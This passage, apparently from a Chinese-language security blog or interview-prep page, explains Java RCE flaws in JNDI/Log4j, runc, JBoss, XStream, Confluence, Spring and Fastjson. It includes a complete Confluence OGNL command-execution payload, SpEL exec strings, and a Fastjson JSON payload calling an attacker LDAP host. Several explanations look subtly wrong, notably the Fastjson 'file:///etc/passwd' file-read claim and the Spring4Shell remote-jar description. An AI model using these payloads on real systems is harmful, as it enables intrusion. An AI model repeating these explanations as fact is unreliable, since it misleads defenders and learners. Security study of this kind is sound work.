<li><strong>再读取文件：</strong> 再次构造反序列化 payload，执行 <code>cat /tmp/result.txt</code>，然后将结果写入到可访问的 Web 文件中，或者通过其他方式带出</li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li>不依赖网络连接</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>操作繁琐，需要多次构造 payload</li>
<li>容易被检测</li>
</ul>
<hr>
<h3 id="JNDI-的解析流程和原理"><a href="#JNDI-的解析流程和原理" class="headerlink" title="JNDI 的解析流程和原理"></a>JNDI 的解析流程和原理</h3><p><strong>JNDI 的解析流程</strong></p>
<p>JNDI 的解析过程可以概括为以下几个步骤：</p>
<ol>
<li><strong>初始上下文（Initial Context）</strong>：应用程序首先通过 <code>javax.naming.InitialContext</code> 类创建一个初始上下文。这个上下文是 JNDI 查找的起点，它包含了连接到特定命名和目录服务所需的环境信息，例如服务提供商的 URL、认证信息等</li>
<li><strong>查找（Lookup）</strong>：应用程序使用 <code>context.lookup(name)</code> 方法来查找一个对象。<code>name</code> 是一个字符串，表示要查找的对象的名称或路径</li>
<li><strong>服务提供商（Service Provider）</strong>：JNDI 会根据初始上下文中配置的服务提供商信息，将查找请求委托给相应的服务提供商。例如，如果 URL 是 <code>ldap://...</code>，则会使用 LDAP 服务提供商；如果 URL 是 <code>rmi://...</code>，则会使用 RMI 服务提供商</li>
<li><strong>命名和目录服务</strong>：服务提供商与实际的命名和目录服务进行通信，并根据请求的名称查找对应的对象</li>
<li><strong>返回结果</strong>：命名和目录服务返回查找到的对象。这个对象可以是任何 Java 对象，例如一个字符串、一个数据库连接，甚至是一个远程方法调用的引用</li>
</ol>
<p><strong>JNDI 注入的原理</strong></p>
<p>JNDI 注入是一种利用 JNDI 漏洞的攻击方式。它的核心思想是，<strong>攻击者控制了 <code>context.lookup(name)</code> 方法中的 <code>name</code> 参数，使其指向一个恶意的远程服务，从而在受害者服务器上执行任意代码</strong></p>
<p>具体原理如下：</p>
<ol>
<li><strong>注入恶意 URL</strong>：攻击者通过某种方式（如 HTTP 请求参数、日志等）将一个恶意的 JNDI URL 注入到应用程序中。这个 URL 通常指向攻击者控制的远程服务器，例如 <code>ldap://attacker.com:1389/Exploit</code></li>
<li><strong>触发查找</strong>：应用程序在处理用户输入时，无意中将这个恶意 URL 作为 <code>context.lookup()</code> 方法的参数进行调用</li>
<li><strong>JNDI 请求恶意服务</strong>：JNDI 框架会向攻击者控制的 LDAP 服务器发起请求，查找 <code>Exploit</code> 这个对象</li>
<li><strong>返回恶意引用</strong>：攻击者的 LDAP 服务器接收到请求后，会返回一个特殊的响应，这个响应中包含了<strong>一个远程代码库（Codebase）的 URL</strong>，例如 <code>http://attacker.com/</code>，以及一个类名 <code>Exploit</code></li>
<li><strong>加载远程类</strong>：当 JNDI 收到这个响应后，它会根据返回的远程代码库 URL，从攻击者的 Web 服务器下载 <code>Exploit.class</code> 文件</li>
<li><strong>执行恶意代码</strong>：JNDI 框架会自动实例化并执行 <code>Exploit</code> 类中的代码。<code>Exploit</code> 类通常包含一个静态代码块或构造函数，用于执行恶意命令，例如反弹 shell、创建文件等</li>
</ol>
<hr>
<h3 id="Log4j-漏洞原理"><a href="#Log4j-漏洞原理" class="headerlink" title="Log4j 漏洞原理"></a>Log4j 漏洞原理</h3><p><strong>1. Log4j 的“查找”（Lookups）功能</strong></p>
<p>Log4j 是一个强大的日志框架，它有一个非常实用的功能叫做 <strong>“查找”（Lookups）</strong>。这个功能允许在日志配置或日志消息中动态地获取一些信息</p>
<p>比如，你可以用 <code>$&#123;sys:user.name&#125;</code> 来打印当前系统的用户名，或者用 <code>$&#123;env:PATH&#125;</code> 来打印系统的环境变量</p>
<p>这些 Lookups 机制让日志功能变得非常灵活</p>
<p><strong>2. JNDI 查找的引入</strong></p>
<p>在 Log4j 的 2.x 版本中，引入了一种新的查找类型：<strong>JNDI Lookup</strong></p>
<ul>
<li><strong>JNDI</strong>（Java Naming and Directory Interface）是 Java 平台的一个 API，它允许程序通过名字来查找和访问各种资源，比如数据库、远程对象等</li>
<li>JNDI 查找支持多种协议，例如：<code>LDAP</code> (轻量级目录访问协议)、<code>RMI</code> (远程方法调用) 和 <code>DNS</code> 等</li>
</ul>
<p>有了 JNDI Lookup，你就可以在日志消息中通过 <code>$&#123;jndi:协议://地址&#125;</code> 的形式去查询一个远程资源</p>
<p><strong>3. 漏洞的核心：JNDI 远程加载类</strong></p>
<p>漏洞的真正核心在于 <strong>JNDI 协议的特性</strong></p>
<p>当 Log4j 看到一个 <code>$&#123;jndi:ldap://...&#125;</code> 字符串时，它会：</p>
<ol>
<li><strong>解析</strong>：识别这是一个 JNDI 查找</li>
<li><strong>请求</strong>：向 <code>ldap://</code> 指定的远程服务器发起请求</li>
<li><strong>接收响应</strong>：LDAP 服务器会返回一个恶意的 <strong>Java 对象</strong>（或者说，指向这个对象的引用）。这个对象通常是一个恶意的 <code>.class</code> 文件</li>
<li><strong>远程加载</strong>：客户端（即 Log4j 所在的程序）在处理这个返回的对象时，会自动去加载并实例化这个恶意的 <code>.class</code> 文件</li>
</ol>
<p>这个过程，就是 <strong>JNDI 注入</strong>。它利用了 JNDI 协议的特性，让程序主动去加载并执行远程服务器上的代码</p>
<hr>
<h3 id="runc-容器逃逸原理"><a href="#runc-容器逃逸原理" class="headerlink" title="runc 容器逃逸原理"></a>runc 容器逃逸原理</h3><p><strong>1. 竞争条件</strong></p>
<p>这是 runc 容器逃逸中一种经典的利用方式。以 <strong>CVE-2019-5736</strong> 为例，其核心原理是：</p>
<ul>
<li><strong>进程切换和文件句柄劫持</strong>：当我们在宿主机上执行 <code>docker exec</code> 等命令时，实际上 runc 会在容器内启动一个新的进程。在 runc 启动这个新进程到真正执行用户指定命令的这段极短的时间内，存在一个“窗口期”</li>
<li><strong>恶意代码的快速覆盖</strong>：攻击者可以在容器内通过一个精心设计的恶意程序，持续地监控并尝试以写权限打开 runc 进程的文件句柄（<code>/proc/self/exe</code>）。一旦 runc 进程完成了权限降级，文件句柄被释放但尚未关闭，攻击者的恶意程序就会立即抢占这个句柄，并向宿主机上的 runc 二进制文件写入恶意 payload</li>
<li><strong>获得宿主机 root 权限</strong>：当 runc 尝试执行后续命令时，它执行的不再是正常的二进制文件，而是已经被篡改的恶意代码。因为 runc 本身是以 root 权限在宿主机上运行的，所以攻击者就成功地以 root 权限执行了任意命令，实现了容器逃逸</li>
</ul>
<p><strong>2. 特权模式与危险配置</strong></p>
<p>虽然这不是 runc 自身的漏洞，但它是最常见的容器逃逸方式之一，常常与 runc 的使用有关</p>
<ul>
<li><strong>特权容器（Privileged Container）</strong>：如果一个容器被以特权模式启动（<code>docker run --privileged</code>），它将获得几乎所有宿主机的 root 能力。这种模式下，容器内的进程可以访问宿主机上的所有设备、挂载宿主机的文件系统，甚至可以操纵内核模块。攻击者可以轻易地通过挂载宿主机根目录并使用 <code>chroot</code> 命令切换根目录，从而完全控制宿主机</li>
<li><strong>Docker Socket 挂载</strong>：另一种常见配置错误是直接将 <code>/var/run/docker.sock</code>（Docker 守护进程的 Unix Socket）挂载到容器内部。这样做的后果是，容器内的进程可以直接与 Docker 守护进程通信，相当于拥有了在宿主机上创建、运行、停止任何容器的权限。攻击者可以利用这个权限创建另一个特权容器，将宿主机根目录挂载进去，然后轻松实现逃逸</li>
</ul>
<p><strong>3. 文件描述符泄漏与符号链接</strong></p>
<p>最近的漏洞，如 <strong>CVE-2024-21626</strong>，则利用了另一种机制：</p>
<ul>
<li><strong>工作目录和文件描述符</strong>：这个漏洞是由于 runc 在处理容器进程的启动和工作目录时存在缺陷。攻击者可以利用 <code>/proc/self/fd/</code> 这个特殊目录，通过设置容器的工作目录或创建符号链接，来访问本不应该被容器访问到的宿主机文件描述符</li>
<li><strong>突破命名空间隔离</strong>：容器通过命名空间（Namespaces）机制来隔离文件系统、进程、网络等资源。但是，如果攻击者可以找到一种方式，让容器内的进程能够操作宿主机上的文件句柄，那么就可以绕过这些命名空间的隔离，从而读写宿主机上的任意文件，最终实现逃逸</li>
</ul>
<hr>
<h3 id="JBoss-反序列化漏洞原理"><a href="#JBoss-反序列化漏洞原理" class="headerlink" title="JBoss 反序列化漏洞原理"></a>JBoss 反序列化漏洞原理</h3><p>在 CVE-2017-7504 的利用中，攻击者通常会利用 <strong>Apache Commons Collections</strong> 库中的 Gadget Chain。这个库在许多 Java 应用中都非常常见，因此它成为了反序列化漏洞攻击的理想目标</p>
<p>攻击步骤如下：</p>
<ol>
<li><strong>构造恶意对象：</strong> 攻击者首先在本地构建一个恶意的 Java 对象，该对象利用 Apache Commons Collections 中的某些类，例如 <code>InvokerTransformer</code>。这个类可以用来反射调用任意方法，例如 <code>java.lang.Runtime.exec()</code></li>
<li><strong>将对象序列化：</strong> 攻击者将这个恶意对象序列化成字节流</li>
<li><strong>发送恶意请求：</strong> 攻击者通过 JBoss Remoting 协议，将这个恶意的字节流发送给存在漏洞的 JBoss 服务器</li>
<li><strong>服务器反序列化：</strong> JBoss 服务器接收到数据后，会调用 <code>ObjectInputStream.readObject()</code> 方法对其进行反序列化</li>
<li><strong>触发 Gadget Chain：</strong> 在反序列化的过程中，Java 会按照字节流中的描述，依次还原对象并调用其中的方法。当执行到攻击者预设的 <code>InvokerTransformer</code> 时，它会反射调用 <code>java.lang.Runtime.exec()</code> 方法，并执行攻击者指定的命令</li>
</ol>
<hr>
<h3 id="XStreadm-反序列化漏洞原理"><a href="#XStreadm-反序列化漏洞原理" class="headerlink" title="XStreadm 反序列化漏洞原理"></a>XStreadm 反序列化漏洞原理</h3><p><strong>1. 核心原理：<code>readObject()</code> 方法和 Bad Gadget</strong></p>
<p>XStream 反序列化漏洞的原理与 <code>CommonsCollections</code> 漏洞非常相似，都是利用 Java 的<strong>反序列化机制</strong>和一些<strong>恶意类（Gadget）</strong></p>
<ol>
<li><strong>恶意 XML 构造</strong>：攻击者首先会找到一个可以被利用的 Java 类（通常称为 “Bad Gadget”），这个类的 <code>readObject()</code> 方法（或其它类似方法，如 <code>finalize()</code>）在反序列化时会触发一些非预期的行为</li>
<li><strong><code>readObject()</code> 的魔法</strong>：当 XStream 对一个 XML 数据进行反序列化时，如果它解析到一个 <code>&lt;object-name&gt;</code> 标签，它会尝试实例化这个类，并调用其 <code>readObject()</code> 方法来填充数据</li>
<li><strong>触发命令执行</strong>：如果攻击者能找到一个 Bad Gadget，它的 <code>readObject()</code> 方法能通过反射或其他方式，间接调用 <code>java.lang.Runtime.exec()</code>，那么就可以实现远程代码执行</li>
</ol>
<p>与 <code>CommonsCollections</code> 不同的是，XStream 的攻击链并不局限于 <code>CommonsCollections</code> 库。<strong>只要能找到一个可以被利用的类，就可以构造出攻击链。</strong></p>
<p><strong>2. 典型的 XStream 攻击链（<code>Groovy</code> 示例）</strong></p>
<p>一个经典的 XStream 攻击链利用了 <code>Groovy</code> 库，它曾经在 XStream 的黑名单之外</p>
<ol>
<li><p><strong>恶意 XML 构造</strong>：攻击者构造一个 XML，其中包含一个 <code>Groovy.lang.Closure</code> 对象。这个对象可以在其 <code>call()</code> 方法中执行任意代码</p>
</li>
<li><p><strong>利用<code>java.util.concurrent.ConcurrentHashMap</code></strong>：攻击者会将 <code>Groovy.lang.Closure</code> 封装到 <code>ConcurrentHashMap</code> 中，并利用其序列化特性</p>
</li>
<li><p><strong>XStream 反序列化</strong>：当 XStream 解析 XML 时，它会创建 <code>ConcurrentHashMap</code> 实例，并填充其数据</p>
</li>
<li><p><strong><code>Groovy</code> 代码执行</strong>：在反序列化过程中，<code>ConcurrentHashMap</code> 会调用其内部的某些方法，这些方法会触发 <code>Groovy.lang.Closure</code> 的 <code>call()</code> 方法，从而执行攻击者预设的 Groovy 代码，例如：</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;whoami&quot;</span>.execute()</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>远程代码执行</strong>：最终，Groovy 代码会被执行，实现了 RCE</p>
</li>
</ol>
<p>这个攻击链的本质是利用了 <code>Groovy.lang.Closure</code> 这个 Bad Gadget，结合 <code>ConcurrentHashMap</code> 的反序列化特性，在不被 XStream 黑名单拦截的情况下，触发了命令执行</p>
<hr>
<h3 id="讲讲-Confluence-RCE"><a href="#讲讲-Confluence-RCE" class="headerlink" title="讲讲 Confluence RCE"></a>讲讲 Confluence RCE</h3><p><strong>1. 漏洞原理</strong></p>
<p>这个漏洞的本质是一个<strong>未授权的远程代码执行（RCE）漏洞</strong>。它存在于 Confluence 的<strong>管理控制台</strong>中，特别是在处理<strong>配置文件</strong>时</p>
<p>攻击者可以利用 Confluence 的某些配置页面（通常与<strong>数据源配置</strong>或<strong>诊断</strong>相关），向服务器发送一个特制的 HTTP 请求。这个请求中包含一个恶意的<strong>OGNL（Object-Graph Navigation Language）表达式</strong></p>
<ul>
<li><strong>OGNL</strong> 是一个强大的表达式语言，常用于 Java 应用中，可以用来在运行时操作 Java 对象</li>
<li><strong>攻击者利用</strong>：攻击者利用了 Confluence 在处理某些未授权页面时，OGNL 表达式没有被正确沙盒化（sandboxed）或过滤的缺陷。这使得攻击者可以在不进行身份验证的情况下，直接传入 OGNL 表达式，并让服务器执行</li>
<li><strong>执行恶意代码</strong>：当服务器解析并执行这个恶意的 OGNL 表达式时，攻击者就可以调用 <code>java.lang.Runtime</code> 等 Java 类，从而在服务器上执行任意的系统命令</li>
</ul>
<p>这个漏洞的危害性极高，因为它完全不需要任何身份验证，攻击者可以直接在网络上扫描到存在漏洞的 Confluence 实例，然后利用它进行攻击</p>
<p><strong>2. 漏洞利用方式</strong></p>
<p>利用这个漏洞通常非常简单，因为攻击者只需要向特定的 URL 发送一个带有恶意 OGRL 表达式的 HTTP 请求即可</p>
<p>一个典型的利用过程如下：</p>
<ol>
<li><p><strong>探测目标</strong>：攻击者首先会扫描互联网，寻找暴露在公网上的 Confluence Data Center 和 Server 实例</p>
</li>
<li><p><strong>发送恶意请求</strong>：攻击者向 Confluence 服务器的某个特定管理 URL 发送一个带有恶意 OGNL Payload 的 GET 或 POST 请求。例如，请求中可能包含如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?diagnostics=x&amp;x=x&#x27;%2b#_memberAccess.allowPrivateAccess%3dtrue%2c#_memberAccess.allowProtectedAccess%3dtrue%2c#_memberAccess.allowPackageProtected%3dtrue%2c#_memberAccess.allowStaticMethodAccess%3dtrue%2c#cmd%3d&#x27;whoami&#x27;%2c#a%3d@java.lang.Runtime@getRuntime().exec(#cmd).getInputStream().readAllBytes()%2c#out%3dnew+java.lang.String(#a)%2c#_memberAccess.allowPrivateAccess%3dfalse%2c#_memberAccess.allowProtectedAccess%3dfalse%2c#_memberAccess.allowPackageProtected%3dfalse%2c#_memberAccess.allowStaticMethodAccess%3dfalse%2c#context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;).getWriter().print(#out)%2c#context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;).getWriter().flush()</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>OGNL 表达式解析</strong>：上面的表达式通过反射调用了 <code>java.lang.Runtime.exec()</code> 方法，并执行了 <code>whoami</code> 命令，最后将命令执行结果写入到 HTTP 响应中，返回给攻击者</li>
</ul>
</li>
<li><p><strong>获取控制权</strong>：如果攻击成功，攻击者就可以在服务器上执行任意命令，例如下载恶意文件、创建新的用户、或者将服务器作为跳板攻击内网</p>
</li>
</ol>
<hr>
<h3 id="讲下-Spring-相关的-RCE-原理"><a href="#讲下-Spring-相关的-RCE-原理" class="headerlink" title="讲下 Spring 相关的 RCE 原理"></a>讲下 Spring 相关的 RCE 原理</h3><p><strong>1. Spring Expression Language (SpEL) 注入</strong></p>
<p><strong>原理</strong>： SpEL 是一种强大的表达式语言，类似于 OGNL，用于在运行时动态地评估和执行表达式。它的强大之处在于，可以调用 Java 类、方法，甚至是系统命令。如果应用程序在处理用户输入时，直接将未经验证的输入作为 SpEL 表达式来解析，就会导致 SpEL 注入漏洞</p>
<p><strong>攻击链</strong>：</p>
<ol>
<li><strong>用户输入</strong>：攻击者在 HTTP 请求中发送一个恶意的 SpEL 表达式，例如： <code>T(java.lang.Runtime).getRuntime().exec(&quot;whoami&quot;)</code></li>
<li><strong>Spring 解析</strong>：应用程序的代码将这个输入作为 SpEL 表达式传递给 <code>SpELParser</code></li>
<li><strong>表达式执行</strong>：SpEL 解释器会解析并执行这个表达式</li>
<li><strong>远程代码执行</strong>：<code>T(java.lang.Runtime).getRuntime().exec(&quot;whoami&quot;)</code> 这段代码会通过反射调用 <code>java.lang.Runtime</code> 类的静态方法 <code>getRuntime()</code>，然后调用 <code>exec()</code> 方法来执行系统命令，从而实现 RCE</li>
</ol>
<p><strong>典型场景</strong>：</p>
<ul>
<li><strong>Spring Boot Actuator</strong>：在旧版本的 Spring Boot 中，Actuator 的某些接口（如 <code>/env</code> 或 <code>/refresh</code>）在配置不当时，可以被利用来执行 SpEL 表达式，从而触发 RCE</li>
</ul>
<p><strong>2. Spring Framework 数据绑定漏洞 (CVE-2022-22965)</strong></p>
<p><strong>原理</strong>： 这个漏洞被称为“<strong>Spring4Shell</strong>”，它利用了 Spring MVC 的<strong>数据绑定</strong>功能。当一个 HTTP 请求被绑定到一个 Java 对象时，Spring 会尝试将请求参数的值设置到对象的属性上。攻击者可以利用这个机制，通过构造恶意的请求参数，来访问和修改一些特殊的、不应该被访问的类属性</p>
<p><strong>攻击链</strong>：</p>
<ol>
<li><strong>用户输入</strong>：攻击者构造一个恶意的 HTTP 请求，其参数名为：<code>class.module.classLoader.URLs[0]=http://malicious-site/evil.jar</code></li>
<li><strong>数据绑定</strong>：Spring 将这个参数绑定到一个 Java 对象</li>
<li><strong>ClassLoader 修改</strong>：Spring 的数据绑定机制会解析这个参数，并最终修改<strong>应用程序的类加载器（ClassLoader）</strong></li>
<li><strong>加载恶意代码</strong>：一旦类加载器被修改，攻击者就可以通过其他请求，让应用程序去加载一个远程的恶意 JAR 包，从而在服务器上执行恶意代码</li>
</ol>
<p><strong>影响</strong>：</p>
<ul>
<li>这个漏洞的危害性极高，因为它影响了 Spring Framework 5.2 及 5.3 版本的核心数据绑定功能。攻击者无需认证即可利用</li>
</ul>
<p><strong>3. Spring Cloud Function SpEL 注入 (CVE-2022-22963)</strong></p>
<p><strong>原理</strong>： 这个漏洞是另一个 SpEL 注入的例子，但它存在于 <strong>Spring Cloud Function</strong> 库中。这个库允许开发者使用函数式编程来处理请求。当通过 Spring Cloud Function 路由请求时，如果路由头（<code>spring.cloud.function.routing-expression</code>）被设置，它的值就会被当作 SpEL 表达式来执行</p>
<p><strong>攻击链</strong>：</p>
<ol>
<li><strong>用户输入</strong>：攻击者在 HTTP 请求的 Header 中添加一个名为 <code>spring.cloud.function.routing-expression</code> 的头，其值为一个恶意的 SpEL 表达式，例如：<code>T(java.lang.Runtime).getRuntime().exec(&quot;whoami&quot;)</code></li>
<li><strong>函数路由</strong>：Spring Cloud Function 在处理请求时，会获取这个头的值</li>
<li><strong>表达式执行</strong>：它会直接将这个值作为 SpEL 表达式来执行，导致 RCE</li>
</ol>
<p><strong>影响</strong>：</p>
<ul>
<li>这个漏洞的利用非常简单，只需要一个 HTTP 请求头即可。它影响了 Spring Cloud Function 3.1.6 和 3.2.2 等版本，危害同样很高</li>
</ul>
<hr>
<h3 id="Log4j-如何绕过-trustURLCodebase"><a href="#Log4j-如何绕过-trustURLCodebase" class="headerlink" title="Log4j 如何绕过 trustURLCodebase"></a>Log4j 如何绕过 trustURLCodebase</h3><p><strong><code>trustURLCodebase</code> 是什么？</strong></p>
<p>在 <strong>JNDI</strong>（Java Naming and Directory Interface）中，<code>trustURLCodebase</code> 是一个非常关键的 JVM 参数。它的作用是：</p>
<ul>
<li>当 JNDI 客户端从远程服务器（例如 RMI 或 LDAP）获取一个 Java 对象时，如果这个对象在本地不存在，JNDI 客户端会根据远程服务器提供的 <code>codebase</code> URL，从<strong>远程下载并加载</strong>这个对象</li>
<li><code>trustURLCodebase</code> 这个参数决定了是否信任这个远程的 <code>codebase</code> URL<ul>
<li><strong><code>true</code></strong>（默认值，在 <strong>JDK 8u191</strong> 之前）：JVM 会无条件地信任并加载远程的代码</li>
<li><strong><code>false</code></strong>（默认值，在 <strong>JDK 8u191</strong> 之后）：JVM 不会加载远程的代码，除非该代码被签名或来自于可信的本地路径</li>
</ul>
</li>
</ul>
<p>因此，<code>trustURLCodebase</code> 设为 <code>false</code> 是一个强大的防御措施，它从根本上阻止了 <strong>JNDI 注入</strong>通过远程加载恶意代码的方式来触发 RCE</p>
<p><strong>Log4j 绕过 <code>trustURLCodebase</code> 的原理</strong></p>
<p>尽管 <code>trustURLCodebase</code> 提供了强大的保护，但攻击者总能找到其他方法来绕过它。Log4j 漏洞的绕过方式，通常是利用 JNDI 注入的<strong>其他特性</strong>或寻找<strong>本地可用的 Gadget Chain</strong></p>
<p><strong>1. 绕过原理一：利用本地 Gadget Chain</strong></p>
<p>这是最常见的绕过方式。如果 JNDI 客户端无法从远程下载恶意代码，那么攻击者就转而利用目标服务器<strong>本地已有的</strong>类库</p>
<ul>
<li><strong>攻击链</strong>：<ol>
<li>攻击者构造一个恶意的 JNDI 请求，例如 <code>ldap://attacker-ip/a</code></li>
<li>在攻击者的 LDAP 服务器上，不返回一个远程 Codebase，而是返回一个指向<strong>本地已存在的、可被反序列化利用的类</strong>。例如，<code>javax.sql.DataSource</code> 或 <code>com.sun.rowset.JdbcRowSetImpl</code></li>
<li>当 JNDI 客户端收到这个响应后，它会认为这个类是本地的，并进行实例化</li>
<li>在实例化或反序列化过程中，这些本地类中的<strong>方法会被自动调用</strong>，例如 <code>JdbcRowSetImpl</code> 的 <code>connect()</code> 方法会触发 JNDI 查找</li>
<li>攻击者可以在 JNDI 查找名中嵌入新的 JNDI URL，指向另一个恶意的服务，最终通过<strong>反射</strong>或<strong>其他本地的 Gadget Chain</strong>来执行命令</li>
</ol>
</li>
<li><strong>本质</strong>：这种绕过方式的核心是<strong>将远程代码加载变成了本地类调用</strong>。它利用了<strong>Java 反序列化</strong>和<strong>反射</strong>，而不再依赖于远程 Codebase 的加载</li>
</ul>
<p><strong>2. 绕过原理二：利用 <code>Serialized</code> 或 <code>Reference</code> 绕过</strong></p>
<p>在某些情况下，攻击者可以利用 JNDI 查找中的 <code>Serialized</code> 或 <code>Reference</code> 对象来绕过限制</p>
<ul>
<li><strong>攻击链</strong>：<ol>
<li>攻击者构造一个 JNDI 请求，其返回结果是一个 <code>Serialized</code> 对象</li>
<li><code>Serialized</code> 对象包含一个<strong>序列化后的 Java 对象</strong></li>
<li>当客户端收到这个 <code>Serialized</code> 对象时，它会<strong>直接对其中的数据进行反序列化</strong></li>
<li>攻击者可以在这个序列化数据中嵌入<strong>任何恶意的 Gadget Chain</strong>（例如 <code>CommonsCollections</code>），从而绕过 <code>trustURLCodebase</code> 的检查，直接触发反序列化漏洞</li>
</ol>
</li>
<li><strong>本质</strong>：这种方法是将 JNDI 注入<strong>转换成了传统的 Java 反序列化漏洞</strong>。它绕过了 JVM 对远程代码加载的限制，转而利用了反序列化本身的设计缺陷</li>
</ul>
<hr>
<h3 id="Fastjson-文件读写-gadget-是哪条，原理是什么"><a href="#Fastjson-文件读写-gadget-是哪条，原理是什么" class="headerlink" title="Fastjson 文件读写 gadget 是哪条，原理是什么"></a>Fastjson 文件读写 gadget 是哪条，原理是什么</h3><p><strong>Fastjson 文件读写 Gadget：<code>JdbcRowSetImpl</code></strong></p>
<p><code>JdbcRowSetImpl</code> 本身是一个 JDBC 相关的类，它的功能是通过 JNDI 来获取数据源。这个类在 Fastjson 中被利用，是因为它的 <code>dataSourceName</code> 属性在反序列化时，会触发一个 JNDI 查找</p>
<p><strong>攻击原理：从 JNDI 注入到文件读写</strong></p>
<p>这条 Gadget 的核心原理是利用 JNDI 协议的<strong>文件查找功能</strong></p>
<ol>
<li><p><strong>Fastjson 漏洞触发</strong>： 攻击者构造一个恶意的 JSON 数据，其中包含 <code>JdbcRowSetImpl</code> 类，并将其 <code>dataSourceName</code> 属性设置为一个恶意的 URL</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://attacker-ip:1389/Exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>当 Fastjson 对这段 JSON 进行反序列化时，会实例化 <code>JdbcRowSetImpl</code> 对象，并调用其 <code>setDataSourceName()</code> 方法。这个方法会触发一个 JNDI 查找</p>
</li>
<li><p><strong>JNDI 文件查找</strong>： JNDI 不仅支持 <code>ldap</code>、<code>rmi</code> 等协议，它也支持 <code>file</code> 协议。<code>file</code> 协议允许 JNDI 客户端查找本地的文件</p>
</li>
<li><p><strong>攻击者构造恶意 JNDI URL</strong>： 攻击者在 <code>dataSourceName</code> 中，将协议从 <code>ldap</code> 替换为 <code>file</code>，并将文件路径设置为目标服务器上的敏感文件，例如 <code>/etc/passwd</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;file:///etc/passwd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>当 Fastjson 反序列化这个 JSON 时，<code>JdbcRowSetImpl</code> 会向 JNDI 服务发起一个本地查找，查找 <code>/etc/passwd</code> 文件</p>
</li>
<li><p><strong>文件读取</strong>： JNDI 服务找到这个文件后，会将其内容作为<strong>一个 Java 对象</strong>返回。这个对象包含了文件的内容。攻击者在自己的服务器上，通过监听端口，就可以截获这个 JNDI 响应，从而获取到 <code>/etc/passwd</code> 文件的内容</p>
</li>
</ol>
<p><strong>为什么能实现“文件写入”？</strong></p>
<p>文件写入的原理与文件读取类似，但它利用的是 JNDI 对**<code>DataSource</code> 对象**的特殊处理</p>
<ol>
<li><strong>构造恶意 <code>DataSource</code></strong>： 攻击者构造一个恶意的 <code>DataSource</code> 对象，这个对象在反序列化时，会执行文件写入操作</li>
<li><strong>JNDI 注入文件写入</strong>： 攻击者将 <code>dataSourceName</code> 设置为一个可以触发 JNDI 注入的 URL，例如 <code>ldap://attacker-ip:1389/WriteFile</code></li>
<li><strong>触发文件写入</strong>： 在攻击者的 LDAP 服务器上，返回一个恶意的 <code>Reference</code> 对象，其 <code>factory</code> 指向一个可以执行文件写入操作的类。当目标服务器接收并加载这个 <code>Reference</code> 对象时，就会触发文件写入</li>
</ol>
<hr>
<h3 id="Spring4shell-原理-检测-利用"><a href="#Spring4shell-原理-检测-利用" class="headerlink" title="Spring4shell 原理&amp;检测&amp;利用"></a>Spring4shell 原理&amp;检测&amp;利用</h3><p><strong>1. Spring4Shell 原理</strong></p>
<p>Spring4Shell 的核心是一个**数据绑定（Data Binding）**漏洞，利用了 Spring MVC 在处理请求参数时的一个逻辑缺陷</p>
<p><strong>数据绑定是什么？</strong> 在 Spring MVC 中，当你向一个 Controller 发送请求时，框架会自动将请求参数（例如 URL 中的查询参数或 POST 请求体）的值，绑定到方法的 Java 对象参数上。这个过程非常方便，但如果绑定过程没有受到严格限制，就会带来安全风险</p>
<p><strong>漏洞的本质</strong> Spring MVC 在数据绑定时，使用了<strong>反射</strong>来设置对象的属性。攻击者发现，可以通过精心构造的请求参数，<strong>利用反射访问并修改一些特殊的对象属性</strong>，例如：</p>
<ul>
<li><strong><code>class</code> 属性</strong>：任何 Java 对象都有一个隐藏的 <code>class</code> 属性，可以用来获取该对象的 <code>ClassLoader</code></li>
<li><strong><code>ClassLoader</code></strong>：这是 Java 虚拟机（JVM）加载类的地方</li>
</ul>
<p><strong>完整的攻击链</strong></p>
<ol>
<li><strong>构造恶意请求</strong>：攻击者发送一个 HTTP 请求，其参数名为 <code>class.module.classLoader.URLs[0]=http://attacker-ip/malicious.jar</code></li>
<li><strong>数据绑定触发</strong>：Spring MVC 收到请求后，会尝试将这个参数绑定到 Controller 方法的 Java 对象上</li>
<li><strong>反射调用</strong>：在绑定过程中，Spring 使用反射，根据 <code>class.module.classLoader</code> 这个路径，一步步获取到应用程序的 <code>ClassLoader</code> 对象</li>
<li><strong>修改 URL</strong>：然后，Spring 会将 <code>attacker-ip/malicious.jar</code> 这个 URL，设置到 <code>ClassLoader</code> 的 <code>URLs</code> 属性中</li>
